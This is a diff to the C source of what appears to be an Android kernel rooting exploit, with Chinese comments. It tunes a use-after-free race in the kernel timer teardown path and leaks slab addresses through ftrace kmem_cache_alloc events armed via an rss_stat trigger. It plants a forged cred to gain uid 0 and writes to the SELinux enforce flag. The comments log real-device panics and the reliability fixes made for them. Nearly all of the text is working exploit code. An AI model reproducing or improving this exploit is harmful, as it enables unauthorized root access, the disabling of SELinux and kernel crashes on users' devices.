@@ -21,6 +21,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/mman.h>
+#include <sys/resource.h>
 #include <sys/syscall.h>
 #include <sys/time.h>
 #include <sys/wait.h>
@@ -30,6 +31,7 @@
 // get offset table from kernel_table.c
 #include "kernel_table.h"
 #include "rawscan.h"
+#include "memguard.h"
 
 /*
  * rootd control surface (implemented in pc98260_rootd.c).
@@ -260,18 +262,47 @@ static void log_sync(void)
 	(void)fdatasync(STDOUT_FILENO);
 }
 
+/*
+ * 把任务的 RSS 计数推过 TASK_RSS_EVENTS_THRESH，触发 kmem/rss_stat 事件。
+ *
+ * ⚠️ 原来这里只 touch **一个** 4 KiB 页（RSS +1）。rss_stat 是**边沿触发**，
+ * 事件的 enable 状态只有在 rss_stat 真正触发时才会被翻转 —— 而
+ * kmem_cache_alloc 的 enable 是靠 trigger 间接开的（uid 2000 直接写
+ * events 下的 enable 文件在真机上被拒：日志里 `armed=trigger enable=?`，
+ * 写失败、读也读不回来）。
+ * 于是单页 bump 很可能**够不着阈值** → 事件从未 enable → 环形缓冲里一条记录
+ * 都没有 → `[uaf] captured=0 chosen=0 raw=0`。
+ *
+ * 这就是「有时能采到、有时采不到」的间歇性来源：RSS 计数离阈值远近不同，
+ * 结果随机。leak_task() 这种「arm 完立刻 fork、马上读」的最短路径最容易中招
+ * （calib_a 里 timer probe 会持续 bump RSS，阈值迟早被跨过，所以 calib 反而没事）。
+ *
+ * → 一次 bump 256 页（1 MiB）并重复若干轮，把计数稳稳推过阈值；
+ *   munmap 会把 RSS 减回去，但事件是边沿触发，enable 状态一旦翻过来就保持。
+ */
+#define RSS_BUMP_PAGES  256
+#define RSS_BUMP_ROUNDS 4
+
 static int kick_rss(void)
 {
-	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
-				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	size_t sz = (size_t)RSS_BUMP_PAGES * 4096;
+	unsigned char *pages;
+	int rc = 0;
+
 	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
 		return -1;
-	if (page != MAP_FAILED) {
-		((volatile unsigned char *)page)[0] = 1;
-		munmap(page, 4096);
+	pages = mmap(NULL, sz, PROT_READ | PROT_WRITE,
+		     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (pages == MAP_FAILED) {
+		rc = -1;
+	} else {
+		for (int r = 0; r < RSS_BUMP_ROUNDS; r++)
+			for (size_t i = 0; i < sz; i += 4096)
+				pages[i] = (unsigned char)(i + (size_t)r);
+		munmap(pages, sz);
 	}
 	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
-	return 0;
+	return rc;
 }
 
 /*
@@ -320,6 +351,12 @@ static void report_arm(const char *mode)
 	v[strcspn(v, "\r\n")] = '\0';
 	dprintf(STDOUT_FILENO, "[trace] kmem_cache_alloc armed=%s enable=%s\n",
 		mode, v);
+	/*
+	 * 立刻落盘。设备若在这一步之后 panic（别的机型套错偏移就可能这样），
+	 * 日志文件里必须已经有这一行 —— 否则崩溃前的最后一步会随 page cache
+	 * 一起丢掉，我们只能拿到一个「没有日志」。
+	 */
+	log_sync();
 }
 
 static int arm_kmem_cache_alloc(void)
@@ -391,6 +428,21 @@ static uint64_t object_pfn(uint64_t ptr)
 	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
 }
 
+/*
+ * 注入阶段的总时间预算（秒）与截止时刻。
+ *
+ * 见 uaf_plant_main 里两轮重试循环的注释：没有预算的话，最坏能跑 30 多分钟，
+ * 宿主那边早就超时判失败了，用户只会看到「卡死」。
+ */
+#define EXPLOIT_BUDGET_SEC 240
+static time_t g_deadline;
+
+/** 预算是否已经用完（未设置截止时刻时不算用完）。 */
+static int budget_exhausted(void)
+{
+	return g_deadline != 0 && time(NULL) >= g_deadline;
+}
+
 static int cpu_count(void);
 
 static int pfn_in_line(const char *line, uint64_t pfn)
@@ -457,6 +509,102 @@ static int cpu_count(void)
 	return n > 16 ? 16 : n;
 }
 
+/* ---------------- trace 环形缓冲的内存预算 + 兜底还原 ----------------
+ *
+ * buffer_size_kb 是**内核全局设置**：进程退出、被杀、崩溃都不会还原。
+ * 旧代码把喷洒阶段的 per-CPU 环形缓冲写死 64 MiB（8 核 = 512 MiB 内核内存），
+ * 而且：
+ *   · 全程不看设备有多少内存（全仓没有任何 /proc/meminfo 读取）；
+ *   · 还原只发生在 disarm() / quiet_reclaim_trace() 两个地方，
+ *     而失败路径大多直接 return -1 走掉了 —— 缓冲停在高位；
+ *   · 没有 atexit、没有信号处理，进程被杀 = 永久泄漏。
+ *
+ * 一轮失败就可能把 128 MiB（16 MiB/CPU × 8）永久钉在内核里，反复重试 →
+ * 设备可用内存越来越低 → 卡死 → watchdog 重启。这与「同内核、别人跑就卡死
+ * 重启、反复重试反复卡」的现象一致，而且和机型/内存大小强相关。
+ *
+ * 这里做三件事：
+ *   1) 按 /proc/meminfo 的 MemTotal 给每 CPU 环形缓冲算预算（memguard.c，
+ *      纯计算，有宿主单测）；
+ *   2) 所有失败路径都还原；
+ *   3) 进程退出（atexit）与可捕获信号都还原。
+ */
+
+/* 设备总内存（KB）。0 = 读不到（未知）。 */
+static uint64_t g_mem_total_kb;
+
+static uint64_t read_mem_total_kb(void)
+{
+	char buf[4096];
+	ssize_t n;
+	int fd = open("/proc/meminfo", O_RDONLY | O_CLOEXEC);
+	uint64_t kb;
+
+	if (fd < 0)
+		return 0;
+	n = read(fd, buf, sizeof(buf) - 1);
+	close(fd);
+	if (n <= 0)
+		return 0;
+	buf[n] = '\0';
+	kb = memguard_parse_memtotal_kb(buf);
+	return kb;
+}
+
+/* 按设备内存算出这个阶段每 CPU 该用多少 KB 的环形缓冲。 */
+static unsigned trace_buf_kb(unsigned want)
+{
+	int ncpu = cpu_count();
+	unsigned kb = memguard_trace_buf_kb(g_mem_total_kb, ncpu, want);
+
+	if (kb != want)
+		dprintf(STDOUT_FILENO,
+			"[mem] trace buffer %u KB/cpu (want %u, memtotal %llu KB, cpus %d)\n",
+			kb, want, (unsigned long long)g_mem_total_kb, ncpu);
+	return kb;
+}
+
+static int write_trace_buf_kb(unsigned kb)
+{
+	char v[16];
+	int n = snprintf(v, sizeof(v), "%u\n", kb);
+
+	if (n <= 0 || (size_t)n >= sizeof(v))
+		return -1;
+	return write_file(TRACE "/buffer_size_kb", v);
+}
+
+/*
+ * 把 trace 状态还原成「没动过」的样子：关 tracing、关事件、把环形缓冲缩回 7 KB。
+ * 幂等：重复调用无害。
+ */
+static void restore_trace_state(void)
+{
+	disarm();
+}
+
+/*
+ * 信号路径只做 async-signal-safe 的最小还原：关 tracing、把环形缓冲缩回 7 KB。
+ * 不能调 disarm()——它要写事件文件、还要 mmap，不是 async-signal-safe。
+ * 还原完恢复默认处置并重新发信号，让退出码语义不变。
+ */
+static void on_fatal_signal(int sig)
+{
+	int fd = open(TRACE "/tracing_on", O_WRONLY | O_CLOEXEC);
+
+	if (fd >= 0) {
+		(void)!write(fd, "0\n", 2);
+		close(fd);
+	}
+	fd = open(TRACE "/buffer_size_kb", O_WRONLY | O_CLOEXEC);
+	if (fd >= 0) {
+		(void)!write(fd, "7\n", 2);
+		close(fd);
+	}
+	signal(sig, SIG_DFL);
+	raise(sig);
+}
+
 static int g_socks[256][2];
 static int g_nsocks;
 
@@ -490,6 +638,50 @@ static int pin_cpu(int cpu)
 	CPU_ZERO(&set);
 	CPU_SET(cpu, &set);
 	return sched_setaffinity(0, sizeof(set), &set);
+}
+
+/*
+ * 关键线程绑核。
+ *
+ * 为什么不绑 CPU 0：CPU 0 是 Android 主线程（UI/Compose）的地盘。注入期间用户
+ * 点一下弹窗，主线程就在 CPU 0 上烧一阵子；而利用原语对时序极其敏感 ——
+ * locker 线程的 mprotect 循环、killer 的 SIGKILL、exec 线程的 execve、父进程的
+ * trace 采集与阶段交接，四者的相对时序决定内核 timer 拆解走哪条路。被抢一下，
+ * 就可能从「良性 UAF」变成「内核 panic」。
+ * 真机症状：注入弹窗上点一下，有一定概率卡死并把设备带崩。
+ *
+ * 父进程与 exec 线程**必须绑同一个核**：两者靠共享的 ipc->phase 互相交接，
+ * 同核才能保持原有的先后关系（交接是 ping-pong，不是并行）。exec 线程与
+ * locker/killer 线程仍然分属两个核（原来就是 CPU 0 与 CPU 1），相对关系不变。
+ *
+ * 核心数少的机器（<= 2）没有富余核，只能退回原来的绑法。
+ */
+#define CRITICAL_CPU 2
+#define RACE_CPU 1
+
+/* 取一个可用的 CPU 编号：优先 preferred，核心不够时退回最后一个核。 */
+static int pick_cpu(int preferred, int ncpu)
+{
+	if (ncpu > preferred)
+		return preferred;
+	return ncpu > 1 ? ncpu - 1 : 0;
+}
+
+/* 关键核：父进程与 exec 线程共用。 */
+static int critical_cpu(void)
+{
+	return pick_cpu(CRITICAL_CPU, cpu_count());
+}
+
+/* 竞态核：race 子进程及其 locker/killer helper 用；与关键核不撞。 */
+static int race_cpu(void)
+{
+	int n = cpu_count();
+	int c = pick_cpu(RACE_CPU, n);
+	int k = critical_cpu();
+	if (c == k && n > 1)
+		c = (k == 0) ? 1 : 0;
+	return c;
 }
 
 /*
@@ -653,6 +845,22 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	g_all_n = s.out_n < s.out_cap ? s.out_n : s.out_cap;
 	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
 		s.out_n, s.chosen, s.bytes);
+	/*
+	 * raw==0 与 raw>0 但 captured==0 是**两种完全不同的失败**，日志必须能区分：
+	 *   raw==0        → 环形缓冲里一条记录都没有 → kmem_cache_alloc 事件多半
+	 *                   没被 enable（rss_stat trigger 没触发）或没产生记录；
+	 *   raw>0 & captured==0 → 记录有，但 call_site / bytes_req 没匹配上。
+	 * 以前两者都只显示 captured=0，下一轮失败时完全无从判断。
+	 */
+	if (s.bytes == 0)
+		dprintf(STDOUT_FILENO,
+			"[uaf] raw buffer EMPTY — 事件多半没被 enable（rss_stat trigger "
+			"没触发），不是匹配问题\n");
+	else if (s.out_n == 0)
+		dprintf(STDOUT_FILENO,
+			"[uaf] 有 %zu 字节记录但没匹配上（call_site/bytes_req 不符）\n",
+			s.bytes);
+	log_sync();
 	*chosen = s.chosen;
 	return (s.out_n > index && s.chosen) ? 0 : -1;
 }
@@ -748,7 +956,7 @@ static void *exec_fn(void *arg)
 	armed_event.sigev_signo = SIGRTMIN;
 	memset(&spec, 0, sizeof(spec));
 	spec.it_value.tv_sec = 3600;
-	if (pin_cpu(0))
+	if (pin_cpu(critical_cpu()))
 		_exit(116);
 	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
 		if (atomic_load_explicit(&g_stop, memory_order_acquire))
@@ -800,7 +1008,7 @@ static int child_race(void)
 	if (prepare_vmas())
 		_exit(110);
 	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
-	if (pin_cpu(1))
+	if (pin_cpu(race_cpu()))
 		_exit(115);
 	for (int i = 0; i < 3; i++) {
 		int pid = spawn_helper(locker_fn, NULL);
@@ -1035,7 +1243,7 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	ncpu = cpu_count();
 	dprintf(STDOUT_FILENO, "[stream_backfill] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
 		g_nstream, base, node_off);
-	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
+	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_RECLAIM))) {
 		close_stream();
 		return -1;
 	}
@@ -1043,6 +1251,8 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	trigger_cmd("enable_event:kmem:mm_page_free\n");
 	if (trace_off_on() || kick_rss()) {
 		close_stream();
+		/* 环形缓冲已经被抬到高位，这里必须还原，否则它会一直占着。 */
+		restore_trace_state();
 		return -1;
 	}
 	{
@@ -1119,13 +1329,15 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
+		restore_trace_state();
 		return -1;
 	}
-	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
-	    arm_kmem_cache_alloc() ||
-	    trace_off_on()) {
+	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)) ||
+	    trace_off_on() ||
+	    arm_kmem_cache_alloc()) {
 		kill(child, SIGKILL);
 		stop_helpers();
+		restore_trace_state();
 		return -1;
 	}
 	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
@@ -1135,6 +1347,7 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
+		restore_trace_state();
 		return -1;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
@@ -1142,6 +1355,7 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
+		restore_trace_state();
 		return -1;
 	}
 	if (nptr < 1500) {
@@ -1149,6 +1363,7 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
+		restore_trace_state();
 		return -1;
 	}
 	disarm_kmem_cache_alloc();
@@ -1159,15 +1374,19 @@ static int one_uaf(uint64_t target)
 		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
 	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
 	dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
+	log_sync();
 		stop_helpers();
+		restore_trace_state();
 		return -1;
 	}
 	close_socks();
 	code = wait_zombie(child, &status);
 	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
 		child, code, status);
-	if (waitpid(child, &status, 0) < 0)
+	if (waitpid(child, &status, 0) < 0) {
+		restore_trace_state();
 		return -1;
+	}
 	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
 	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
 	log_sync();
@@ -1176,6 +1395,7 @@ static int one_uaf(uint64_t target)
 	stop_helpers();
 	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
 		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
+		restore_trace_state();
 		return -1;
 	}
 	return 0;
@@ -1205,9 +1425,57 @@ static void cred_child(void)
 	 * can be reclaimed under us and the cred read back as the original uid
 	 * (that is exactly the "[cred] installed" followed by "Uid: 2000" symptom).
 	 * MCL_FUTURE keeps pages allocated later (fork, heap growth) locked too.
+	 *
+	 * ⚠️ 真机 2026-10-31 18:24 实测 `mlockall errno=12`（ENOMEM）—— **整个调用
+	 * 失败，连 MCL_FUTURE 也没生效**，保护完全落空。这与「少数情况跑提权会卡死
+	 * 然后设备重启」高度吻合（页被回收 → cred 变悬空指针 → kernel panic）。
+	 *
+	 * ENOMEM 的成因：MCL_CURRENT 要锁定**全部已映射页**，而这个子进程继承了
+	 * 整个 Android 运行时的地址空间（libc / libc++ 的文本与数据，十几 MB），
+	 * Android 上 RLIMIT_MEMLOCK 又很小（uid 2000 默认 8 MB 甚至更小）→ 超额。
+	 *
+	 * 三步走，把「至少 MCL_FUTURE 生效」变成必然：
+	 *   1) 先抬 RLIMIT_MEMLOCK —— cred 子进程从 fork 起就带着伪造的 cred，
+	 *      此时已经是 uid 0，setrlimit 应当能成功（失败也无妨，继续下一步）；
+	 *   2) 再单独上 MCL_FUTURE —— 它只约束**未来**的分配，额度消耗极小，
+	 *      几乎必成；
+	 *   3) 最后叠加 MCL_CURRENT（best-effort）。第 2 步拿到的 MCL_FUTURE 在
+	 *      第 3 步失败时**依然生效**，不会像原来那样一次失败全丢。
 	 */
+	{
+		struct rlimit rl;
+		if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0) {
+			dprintf(STDOUT_FILENO,
+				"[child-cred] memlock limit cur=%llu max=%llu\n",
+				(unsigned long long)rl.rlim_cur,
+				(unsigned long long)rl.rlim_max);
+			/*
+			 * 软限抬到硬限**不需要任何特权**（只有抬过硬限才需要
+			 * CAP_SYS_RESOURCE，而这里 uid 还是 2000，拿不到）。
+			 * 硬限本身在 Android 上通常比软限宽裕得多。
+			 */
+			if (rl.rlim_cur != rl.rlim_max) {
+				struct rlimit up = rl;
+				up.rlim_cur = rl.rlim_max;
+				if (setrlimit(RLIMIT_MEMLOCK, &up) != 0)
+					dprintf(STDOUT_FILENO,
+						"[child-cred] warn: setrlimit(MEMLOCK soft->hard) errno=%d\n",
+						errno);
+			}
+		} else {
+			dprintf(STDOUT_FILENO, "[child-cred] warn: getrlimit(MEMLOCK) errno=%d\n",
+				errno);
+		}
+	}
+	if (mlockall(MCL_FUTURE))
+		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall(MCL_FUTURE) errno=%d\n",
+			errno);
 	if (mlockall(MCL_CURRENT | MCL_FUTURE))
-		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall errno=%d\n", errno);
+		dprintf(STDOUT_FILENO,
+			"[child-cred] warn: mlockall(MCL_CURRENT) errno=%d "
+			"(MCL_FUTURE 仍然生效)\n", errno);
+	else
+		dprintf(STDOUT_FILENO, "[child-cred] mlockall ok (CURRENT|FUTURE)\n");
 	for (;;) {
 		unsigned uid, euid, gid, egid;
 		unsigned char go;
@@ -1243,7 +1511,23 @@ static void cred_child(void)
 				for (;;)
 					pause();
 			}
-			continue;
+			/*
+			 * 父进程没了（管道 EOF）。
+			 *
+			 * 这里**不能** continue：read 在已关闭的管道上立刻返回 0，
+			 * continue 回去就是 100% CPU 的死循环 —— 一个核被吃满，设备
+			 * 会被拖卡，watchdog 随后会重启它。反复重试就会攒下一堆。
+			 *
+			 * 也不能退出：退出等于把父进程钉着的那批页放掉，本进程手里
+			 * 那份伪造 cred 随即变成悬空指针，踩上去就是 kernel panic
+			 * （真机 2026-10-31 22:11 的教训）。所以正确姿势是「什么都不做」：
+			 * 安静地停在这里，等着被重启带走。
+			 */
+			dprintf(STDOUT_FILENO,
+				"[child-cred] parent gone, parking (no CPU burn)\n");
+			log_sync();
+			for (;;)
+				pause();
 		}
 		if (go == 0xAA) {
 			/* Daemon command: acknowledge, drop the pipes, and keep looping
@@ -1472,7 +1756,20 @@ static int leak_task(void)
 
 	if (pipe(g_wake) || pipe(g_report))
 		return -1;
-	if (arm_kmem_cache_alloc() || trace_off_on())
+	/*
+	 * 顺序很重要：**先开 tracing，再 arm**。
+	 *
+	 * rss_stat 是**边沿触发**：kmem_cache_alloc 的 enable 靠
+	 * "enable_event:kmem:kmem_cache_alloc" 挂在 rss_stat 上，rss_stat 真正
+	 * 触发一次，事件才被打开。而 tracepoint 只有在 tracing_on=1 时才会被
+	 * 记录 —— tracing 关着的时候 kick_rss 推多少 RSS 都不会有 rss_stat 记录，
+	 * 事件就永远 enable 不上，采集到 0 条（`[uaf] captured=0 chosen=0 raw=0`）。
+	 *
+	 * 真机上 uid 2000 直接写 events 下的 enable 文件是**被拒**的（日志里
+	 * `armed=trigger enable=?`，写失败、读也读不回来），所以只剩 trigger 这
+	 * 一条路，顺序错了就必然采不到。
+	 */
+	if (trace_off_on() || arm_kmem_cache_alloc())
 		return -1;
 	g_cred_child_pid = fork();
 	if (g_cred_child_pid == 0)
@@ -1655,12 +1952,36 @@ int uaf_plant_main(int argc, char **argv)
 	if (argc > 1 && argv[1][0] != '-')
 		g_shift = (unsigned)atoi(argv[1]);
 	sigaction(SIGALRM, &action, NULL);
+	/*
+	 * trace 状态是**内核全局**的：进程退出、被杀、崩溃都不会自动还原。
+	 * 注册 atexit + 可捕获信号，保证「无论怎么退出」都不会把抬高的
+	 * 环形缓冲留在内核里（那是每次失败都要扣掉的成百上千 MiB）。
+	 */
+	atexit(restore_trace_state);
+	{
+		struct sigaction fa;
+		memset(&fa, 0, sizeof(fa));
+		fa.sa_handler = on_fatal_signal;
+		sigemptyset(&fa.sa_mask);
+		fa.sa_flags = 0;
+		sigaction(SIGINT, &fa, NULL);
+		sigaction(SIGTERM, &fa, NULL);
+		sigaction(SIGHUP, &fa, NULL);
+		sigaction(SIGQUIT, &fa, NULL);
+	}
+	g_mem_total_kb = read_mem_total_kb();
+	dprintf(STDOUT_FILENO, "[mem] memtotal=%llu KB cpus=%d\n",
+		(unsigned long long)g_mem_total_kb, cpu_count());
 	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
 		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (ipc == MAP_FAILED)
 		return 1;
 	memset(ipc, 0, sizeof(*ipc));
-	if (pin_cpu(0))
+	/*
+	 * 父进程绑到 CRITICAL_CPU（和 exec 线程同一个核），避开 CPU 0 ——
+	 * 理由见 pick_cpu 上面的注释。
+	 */
+	if (pin_cpu(critical_cpu()))
 		return 1;
 	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
 	if (!g_ctx)
@@ -1669,7 +1990,7 @@ int uaf_plant_main(int argc, char **argv)
 		getuid(), geteuid(), getgid());
 	read_enforce();
 	g_nrings = 0;
-	if (write_file(TRACE "/buffer_size_kb", "16384\n"))
+	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)))
 		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
 	if (leak_task()) {
 		dprintf(STDOUT_FILENO, "[task] leak failed\n");
@@ -1677,6 +1998,19 @@ int uaf_plant_main(int argc, char **argv)
 		return 5;
 	}
 	g_plant_cred = 0;
+	/*
+	 * 注入阶段的总时间预算。
+	 *
+	 * 一轮 one_uaf 最坏要 ~90 s（wait_phase 30 s ×2 + stream backfill 8 s +
+	 * wait_zombie 20 s），SELinux 阶段 12 轮 + cred 阶段 12 轮 = 最多 24 轮。
+	 * 不设预算的话最坏能跑 **30 多分钟**，而宿主那边 INJECT 超时只有 300 s：
+	 * 宿主先判失败、把原生进程留在原地继续跑，用户看到的就是「卡死在那儿不动」，
+	 * 反复重试还会攒下一堆满负荷空转的进程。
+	 *
+	 * 每轮开始前查一次预算，到点就收手：宁可这轮失败退出，也不要让设备长时间
+	 * 4 个 helper 线程 100% spin（8 核上占掉一半）。
+	 */
+	g_deadline = time(NULL) + EXPLOIT_BUDGET_SEC;
 	{
 		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
 		for (int i = 1; i <= 12; i++) {
@@ -1691,6 +2025,12 @@ int uaf_plant_main(int argc, char **argv)
 				dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
 				break;
 			}
+			if (budget_exhausted()) {
+				dprintf(STDOUT_FILENO,
+					"[budget] selinux phase stopped after %d attempt(s): time budget %d s exhausted\n",
+					i - 1, EXPLOIT_BUDGET_SEC);
+				break;
+			}
 			dprintf(STDOUT_FILENO,
 				"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
 				i, sel);
@@ -1703,7 +2043,14 @@ int uaf_plant_main(int argc, char **argv)
 	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1;
 		int fixed_uid = -1, fixed_suid = -1;
+		if (budget_exhausted()) {
+			dprintf(STDOUT_FILENO,
+				"[budget] cred phase stopped after %d attempt(s): time budget %d s exhausted\n",
+				attempt - 1, EXPLOIT_BUDGET_SEC);
+			break;
+		}
 		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
+		log_sync();
 		g_plant_cred = 1;
 		if (one_uaf(0))
 			continue;
@@ -1711,9 +2058,17 @@ int uaf_plant_main(int argc, char **argv)
 		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
 		log_sync();
 		log_proc_uid(g_cred_child_pid);
-		for (int i = 0; i < 3 && fixed_uid; i++)
+		/*
+		 * 下面两个「补写 uid / suid」的循环各自最多再开 3 轮 UAF，
+		 * 所以**一轮 plant 最多是 1 + 3 + 3 = 7 次 UAF**，
+		 * 12 次 plant 加上 SELinux 阶段的 12 次，理论上能开到 **96 次** UAF。
+		 *
+		 * 每一次 UAF 都在内核的 timer 拆解路径上制造一次悬空 —— 命中内核竞态
+		 * 就是 kernel panic。所以次数本身就是崩溃概率的乘数，必须一起算进预算。
+		 */
+		for (int i = 0; i < 3 && fixed_uid && !budget_exhausted(); i++)
 			fixed_uid = one_uaf(g_cred_kva + 8);
-		for (int i = 0; i < 3 && fixed_suid; i++)
+		for (int i = 0; i < 3 && fixed_suid && !budget_exhausted(); i++)
 			fixed_suid = one_uaf(g_cred_kva + 16);
 		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
 			rooted = 1;
@@ -1724,6 +2079,13 @@ int uaf_plant_main(int argc, char **argv)
 	}
 	if (!rooted) {
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
+		log_sync();
+		/*
+		 * 失败路径：先把抬高的环形缓冲还回去。
+		 * 这个进程接下来会一直挂着（host 等 rootd 超时），不能让它
+		 * 顺手把上百 MiB 内核内存也一起挂住。
+		 */
+		restore_trace_state();
 		for (;;)
 			pause();
 	}
